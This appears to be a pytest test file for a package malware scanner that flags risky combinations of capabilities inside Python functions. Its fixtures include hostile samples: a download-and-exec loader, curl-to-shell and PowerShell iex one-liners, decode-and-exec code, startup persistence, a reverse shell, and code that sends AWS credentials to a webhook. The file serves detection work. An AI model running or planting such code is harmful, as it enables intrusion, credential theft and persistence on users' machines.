"""Code that runs only when called: units of code and the combinations they make."""

import pytest

from buckthorn import scan
from buckthorn.code import call_units
from buckthorn.scan import scan_sdist, scan_wheel

PLAIN_SETUP = "from setuptools import setup\nsetup(name='pkg', version='1.0')\n"
# A loader that downloads code and runs it, only when the user calls fetch().
LOADER = "import urllib.request\ndef fetch(url):\n    exec(urllib.request.urlopen(url).read())\n"


def _units(source: str, whole_file: bool = False, entry=None) -> dict[str, set[str]]:
    return {
        unit.name: {hit.kind for hit in unit.hits}
        for unit in call_units(source, entry or {}, whole_file)
    }


def test_a_function_is_a_unit_with_its_own_hits():
    source = "import urllib.request\ndef fetch(u):\n    exec(urllib.request.urlopen(u).read())\n"
    assert _units(source) == {"fetch": {"network", "exec"}}


def test_a_unit_takes_in_what_it_calls_in_the_same_file():
    source = (
        "import requests, subprocess\n"
        "def get(u):\n    return requests.get(u).content\n"
        "def run(p):\n    subprocess.run([p])\n"
        "def main(u):\n    run(get(u))\n"
        "class C:\n"
        "    def a(self):\n        self.b()\n"
        "    def b(self):\n        requests.post('x')\n"
    )
    units = _units(source)
    assert units["main"] == {"network", "process"}
    assert units["get"] == {"network"}
    assert units["C.a"] == {"network"}


def test_nested_functions_are_their_own_units_and_reached_from_outside():
    source = "import os\ndef outer():\n    def inner():\n        os.system('x')\n    inner()\n"
    units = _units(source)
    assert units["outer"] == {"process"}
    assert units["outer.inner"] == {"process"}


def test_code_that_runs_at_import_is_not_a_call_time_unit():
    source = (
        "import os\n"
        "os.system('at import')\n"
        "def setup():\n    os.system('x')\n"
        "setup()\n"
        "def later():\n    os.system('y')\n"
        "def hook():\n    os.system('z')\n"
    )
    assert _units(source, entry={"hook": "called at import by pkg/a.py"}) == {"later": {"process"}}


def test_a_whole_file_counts_its_top_level_as_a_unit():
    source = "import os\nos.system('x')\ndef f():\n    os.system('y')\nf()\n"
    assert _units(source, whole_file=True) == {"<module>": {"process"}, "f": {"process"}}


def test_units_with_no_hits_are_left_out():
    assert _units("def f():\n    return 1\n") == {}


# Scanning in call-time mode: only a combination in one unit is flagged.


@pytest.fixture
def call_time(monkeypatch):
    monkeypatch.setattr(scan, "CALL_TIME", True)


def _flagged(findings):
    return sorted({(f.file_path, f.rule_id) for f in findings if f.severity.value != "info"})


def test_call_time_is_off_by_default(make_wheel, monkeypatch):
    monkeypatch.setattr(scan, "CALL_TIME", False)
    assert scan_wheel(make_wheel({"pkg/__init__.py": LOADER})) == []


def test_a_single_capability_when_called_is_not_flagged(make_wheel, call_time):
    source = "import requests, subprocess\ndef get(u):\n    return requests.get(u)\n"
    source += "def run(c):\n    subprocess.run(c)\n"
    assert scan_wheel(make_wheel({"pkg/__init__.py": source})) == []


def test_import_time_code_keeps_its_own_rules(make_wheel, call_time):
    source = "import urllib.request\nexec(urllib.request.urlopen('http://x').read())\n"
    rules = {f.rule_id for f in scan_wheel(make_wheel({"pkg/__init__.py": source}))}
    assert rules == {"BKT-IMPORT-001", "BKT-IMPORT-003"}


def test_fetch_and_run(make_wheel, make_sdist, call_time):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": LOADER}))
    assert _flagged(findings) == [("pkg/__init__.py", "BKT-CALL-001")]
    assert findings[0].metadata["lines"] == [3]
    assert "fetch()" in findings[0].message
    sdist = make_sdist({"setup.py": PLAIN_SETUP, "pkg/__init__.py": "", "tests/t.py": LOADER})
    assert _flagged(scan_sdist(sdist)) == [("pkg-1.0/tests/t.py", "BKT-CALL-001")]


@pytest.mark.parametrize(
    "body",
    [
        # writes the download, then runs that file
        "    p = os.path.join(os.getenv('TEMP'), 'x.exe')\n"
        "    with open(p, 'wb') as f:\n        f.write(requests.get(u).content)\n"
        "    subprocess.Popen([p])\n",
        "    urllib.request.urlretrieve(u, '/tmp/a')\n    os.system('chmod +x /tmp/a && /tmp/a')\n",
        "    r = requests.get(u)\n    open(f'C://K//s.exe', 'wb').write(r.content)\n"
        "    os.system('start C://K//s.exe')\n",
        "    p = pathlib.Path(tempfile.gettempdir()) / 'x.exe'\n"
        "    p.write_bytes(requests.get(u).content)\n    subprocess.Popen([p])\n",
        # a command that downloads and runs in one line
        "    os.system('curl -s http://x/a | sh')\n",
        "    subprocess.run(['powershell', '-c', 'irm get.x/i.ps1 | iex'])\n",
    ],
)
def test_fetch_a_file_and_run_it(make_wheel, call_time, body):
    source = "import os, pathlib, tempfile, subprocess, requests, urllib.request\ndef f(u):\n"
    source += body
    assert _flagged(scan_wheel(make_wheel({"pkg/m.py": source}))) == [("pkg/m.py", "BKT-CALL-001")]


@pytest.mark.parametrize(
    "body",
    [
        "    open('log.txt', 'w').write(requests.get(u).text)\n    subprocess.run(['make'])\n",
        "    open(f'{u}/out.txt', 'w')\n    requests.get(u)\n    os.system(f'{v}/run')\n",
        "    subprocess.run(['git', 'clone', 'https://x/y.git'])\n",
        # writes into a folder, then runs a tool in that folder
        "    open(os.path.join(u, 'index.html'), 'w').write('x')\n"
        "    subprocess.run(['git', 'add', '.'], cwd=u)\n    requests.post(v)\n",
        # a command that reads the file it wrote
        "    open('result.json', 'w').write(requests.get(u).text)\n"
        "    os.system('jq . result.json')\n",
    ],
)
def test_fetch_write_and_run_other_things(make_wheel, call_time, body):
    source = "import os, subprocess, requests\ndef f(u, v):\n" + body
    assert scan_wheel(make_wheel({"pkg/m.py": source})) == []


def test_curl_pipe_to_shell_is_not_decoding(make_wheel, call_time):
    source = "import base64, os\ndef f(c):\n    base64.b64decode(c)\n"
    source += "    os.system('curl -fsSL https://get.x | sh')\n"
    assert _flagged(scan_wheel(make_wheel({"pkg/m.py": source}))) == [("pkg/m.py", "BKT-CALL-001")]


def test_a_main_block_runs_when_called(make_wheel, call_time):
    source = "import urllib.request\nif __name__ == '__main__':\n"
    source += "    exec(urllib.request.urlopen('http://x').read())\n"
    assert _flagged(scan_wheel(make_wheel({"pkg/tool.py": source}))) == [
        ("pkg/tool.py", "BKT-CALL-001")
    ]


def test_a_file_setup_py_execs_has_its_functions_read(make_sdist, call_time):
    version = "__version__ = '1.0'\nimport base64\ndef get():\n    exec(base64.b64decode(B))\n"
    setup = "exec(open('pkg/_version.py').read())\n" + PLAIN_SETUP
    sdist = make_sdist({"setup.py": setup, "pkg/__init__.py": "", "pkg/_version.py": version})
    assert ("pkg-1.0/pkg/_version.py", "BKT-CALL-002") in _flagged(scan_sdist(sdist))


def test_a_long_chain_of_calls_is_read_in_bounded_time():
    # each function holds a hit and calls the next: every unit reaches all the rest
    n = 3000
    source = "import os\n" + "".join(
        f"def f{i}():\n    os.system('x')\n    f{i + 1}()\n" for i in range(n)
    )
    units = call_units(source)
    assert len(units) == n
    assert all(len(unit.hits) <= 3 for unit in units)


def test_fetch_and_run_split_across_functions(make_wheel, call_time):
    source = (
        "import urllib.request\n"
        "def get(u):\n    return urllib.request.urlopen(u).read()\n"
        "def main():\n    exec(get('http://x'))\n"
    )
    assert _flagged(scan_wheel(make_wheel({"pkg/m.py": source}))) == [("pkg/m.py", "BKT-CALL-001")]


@pytest.mark.parametrize(
    "body",
    [
        "    code = base64.b64decode(blob)\n    exec(code)\n",
        "    data = zlib.decompress(blob)\n    open('/tmp/x.bin', 'wb').write(data)\n"
        "    subprocess.Popen(['/tmp/x.bin'])\n",
    ],
)
def test_decode_and_run(make_wheel, call_time, body):
    source = "import base64, zlib, subprocess\ndef f(blob):\n" + body
    assert _flagged(scan_wheel(make_wheel({"pkg/m.py": source}))) == [("pkg/m.py", "BKT-CALL-002")]


def test_decode_and_run_something_else(make_wheel, call_time):
    source = "import base64, subprocess\ndef f(blob):\n    base64.b64decode(blob)\n"
    source += "    subprocess.run(['git', 'status'])\n"
    assert scan_wheel(make_wheel({"pkg/m.py": source})) == []


@pytest.mark.parametrize(
    "body",
    [
        "    with open(os.path.expanduser('~/.bashrc'), 'a') as f:\n"
        "        f.write(requests.get(u).text)\n",
        "    key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    requests.get(u)\n",
    ],
)
def test_persist_and_fetch(make_wheel, call_time, body):
    source = "import os, requests\ndef f(u):\n" + body
    assert _flagged(scan_wheel(make_wheel({"pkg/m.py": source}))) == [("pkg/m.py", "BKT-CALL-003")]


def test_a_shell_profile_without_the_network(make_wheel, call_time):
    # shell completion installers (argcomplete) add a line to ~/.zshenv
    source = "import os\ndef f(line):\n    rc = os.path.expanduser('~/.zshenv')\n"
    source += "    with open(rc, 'a') as fh:\n        fh.write(line)\n"
    assert scan_wheel(make_wheel({"pkg/m.py": source})) == []


def test_a_start_up_location_in_a_docstring(make_wheel, call_time):
    source = "import requests\ndef update(u):\n"
    source += '    """Adds a line to your crontab so updates run nightly."""\n    requests.get(u)\n'
    assert scan_wheel(make_wheel({"pkg/m.py": source})) == []


def test_reverse_shell(make_wheel, call_time):
    source = (
        "import os, pty, socket\n"
        "def f(h):\n"
        "    s = socket.socket()\n    s.connect((h, 4444))\n"
        "    for fd in (0, 1, 2):\n        os.dup2(s.fileno(), fd)\n"
        "    pty.spawn('/bin/sh')\n"
    )
    assert _flagged(scan_wheel(make_wheel({"pkg/m.py": source}))) == [("pkg/m.py", "BKT-CALL-004")]


def test_read_credentials_and_send(make_wheel, call_time):
    source = (
        "import os, requests\n"
        "def f(hook):\n"
        "    data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
        "    requests.post(hook, data=data)\n"
    )
    assert _flagged(scan_wheel(make_wheel({"pkg/m.py": source}))) == [("pkg/m.py", "BKT-CALL-005")]


def test_an_ssh_client_that_builds_a_key_path(make_wheel, call_time):
    # paramiko and friends name ~/.ssh in a path builder and connect: not flagged
    source = (
        "import os, socket\n"
        "def connect(host):\n"
        "    key = os.path.join(os.path.expanduser('~'), '.ssh', 'id_rsa')\n"
        "    socket.create_connection((host, 22))\n"
        "    return key\n"
    )
    assert scan_wheel(make_wheel({"pkg/m.py": source})) == []


def test_a_daemon_that_closes_its_streams(make_wheel, call_time):
    source = (
        "import os, subprocess\n"
        "def daemonize(cmd):\n"
        "    null = open(os.devnull)\n    os.dup2(null.fileno(), 0)\n"
        "    subprocess.Popen(cmd)\n"
    )
    assert scan_wheel(make_wheel({"pkg/m.py": source})) == []
